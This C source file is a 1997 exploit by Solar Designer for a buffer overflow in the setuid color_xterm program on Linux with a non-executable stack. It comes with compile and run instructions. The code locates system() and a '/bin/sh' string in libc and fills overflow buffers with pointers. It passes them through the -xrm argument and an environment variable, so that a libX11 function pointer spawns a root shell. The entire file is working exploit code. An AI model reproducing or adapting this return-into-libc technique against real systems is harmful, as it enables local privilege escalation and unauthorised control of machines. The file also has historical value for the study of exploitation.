/*
     * color_xterm   buffer    overflow   exploit   for   Linux   with
     * non-executable stack
     * Copyright (c) 1997 by Solar Designer
     *
     * Compile:
     * gcc cx.c -o cx -L/usr/X11/lib \
     * `ldd /usr/X11/bin/color_xterm | sed -e s/^.lib/-l/ -e s/\\\.so.\\\+//`
     *
     * Run:
     * $ ./cx
     * system() found at: 401553b0
     * "/bin/sh" found at: 401bfa3d
     * bash# exit
     * Segmentation fault
     */

    #include <stdio.h>
    #include <unistd.h>
    #include <string.h>
    #include <stdlib.h>
    #include <signal.h>
    #include <setjmp.h>
    #include <sys/ptrace.h>
    #include <sys/types.h>
    #include <sys/wait.h>

    #define SIZE1           1200    /* Amount of data to overflow with */
    #define ALIGNMENT1      0       /* 0..3 */
    #define OFFSET          22000   /* Structure array offset */
    #define SIZE2           16000   /* Structure array size */
    #define ALIGNMENT2      5       /* 0, 4, 1..3, 5..7 */
    #define SIZE3           SIZE2
    #define ALIGNMENT3      (ALIGNMENT2 & 3)

    #define ADDR_MASK       0xFF000000

    char buf1[SIZE1], buf2[SIZE2 + SIZE3], *buf3 = &buf2[SIZE2];
    int *ptr;

    int pid, pc, shell, step;
    int started = 0;
    jmp_buf env;

    void handler() {
      started++;
    }

    /* SIGSEGV handler, to search in libc */
    void fault() {
      if (step < 0) {
    /* Change the search direction */
        longjmp(env, 1);
      } else {
    /* The search failed in both directions */
        puts("\"/bin/sh\" not found, bad luck");
        exit(1);
      }
    }

    void error(char *fn) {
      perror(fn);
      if (pid > 0) kill(pid, SIGKILL);
      exit(1);
    }

    int nz(int value) {
      if (!(value & 0xFF)) value |= 8;
      if (!(value & 0xFF00)) value |= 0x100;

      return value;
    }

    void main() {
    /*
     * A portable way to get the stack pointer value; why do other exploits use
     * an assembly instruction here?!
     */
      int sp = (int)&sp;

      signal(SIGUSR1, handler);

    /* Create a child process to trace */
      if ((pid = fork()) < 0) error("fork");

      if (!pid) {
    /* Send the parent a signal, so it starts tracing */
        kill(getppid(), SIGUSR1);
    /* A loop since the parent may not start tracing immediately */
        while (1) system("");
      }

    /* Wait until the child tells us the next library call will be system() */
      while (!started);

      if (ptrace(PTRACE_ATTACH, pid, 0, 0)) error("PTRACE_ATTACH");

    /* Single step the child until it gets out of system() */
      do {
        waitpid(pid, NULL, WUNTRACED);
        pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
        if (pc == -1) error("PTRACE_PEEKUSR");
        if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) error("PTRACE_SINGLESTEP");
      } while ((pc & ADDR_MASK) != ((int)main & ADDR_MASK));

    /* Single step the child until it calls system() again */
      do {
        waitpid(pid, NULL, WUNTRACED);
        pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
        if (pc == -1) error("PTRACE_PEEKUSR");
        if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0)) error("PTRACE_SINGLESTEP");
      } while ((pc & ADDR_MASK) == ((int)main & ADDR_MASK));

    /* Kill the child, we don't need it any more */
      if (ptrace(PTRACE_KILL, pid, 0, 0)) error("PTRACE_KILL");
      pid = 0;

      printf("system() found at: %08x\n", pc);

    /* Let's hope there's an extra NOP if system() is 256 byte aligned */
      if (!(pc & 0xFF))
      if (*(unsigned char *)--pc != 0x90) pc = 0;

    /* There's no easy workaround for these (except for using another function) */
      if (!(pc & 0xFF00) || !(pc & 0xFF0000) || !(pc & 0xFF000000)) {
        puts("Zero bytes in address, bad luck");
        exit(1);
      }

    /*
     * Search for a "/bin/sh" in libc until we find a copy with no zero bytes
     * in its address. To avoid specifying the actual address that libc is
     * mmap()ed to we search from the address of system() in both directions
     * until a SIGSEGV is generated.
     */
      if (setjmp(env)) step = 1; else step = -1;
      shell = pc;
      signal(SIGSEGV, fault);
      do
        while (memcmp((void *)shell, "/bin/sh", 8)) shell += step;
      while (!(shell & 0xFF) || !(shell & 0xFF00) || !(shell & 0xFF0000));
      signal(SIGSEGV, SIG_DFL);

      printf("\"/bin/sh\" found at: %08x\n", shell);

    /* buf1 (which we overflow with) is filled with pointers to buf2 */
      memset(buf1, 'x', ALIGNMENT1);
      ptr = (int *)(buf1 + ALIGNMENT1);
      while ((char *)ptr < buf1 + SIZE1 - sizeof(int))
        *ptr++ = nz(sp - OFFSET);           /* db */
      buf1[SIZE1 - 1] = 0;

    /* buf2 is filled with pointers to "/bin/sh" and to buf3 */
      memset(buf2, 'x', SIZE2 + SIZE3);
      ptr = (int *)(buf2 + ALIGNMENT2);
      while ((char *)ptr < buf2 + SIZE2) {
        *ptr++ = shell;                     /* db->mbstate */
        *ptr++ = nz(sp - OFFSET + SIZE2);   /* db->methods */
      }

    /* buf3 is filled with pointers to system() */
      ptr = (int *)(buf3 + ALIGNMENT3);
      while ((char *)ptr < buf3 + SIZE3 - sizeof(int))
        *ptr++ = pc;                        /* db->methods->mbfinish */
      buf3[SIZE3 - 1] = 0;

    /* Put buf2 and buf3 on the stack */
      setenv("BUFFER", buf2, 1);

    /* GetDatabase() in libX11 will do (*db->methods->mbfinish)(db->mbstate) */
      execl("/usr/X11/bin/color_xterm", "color_xterm", "-xrm", buf1, NULL);
      error("execl");
    }
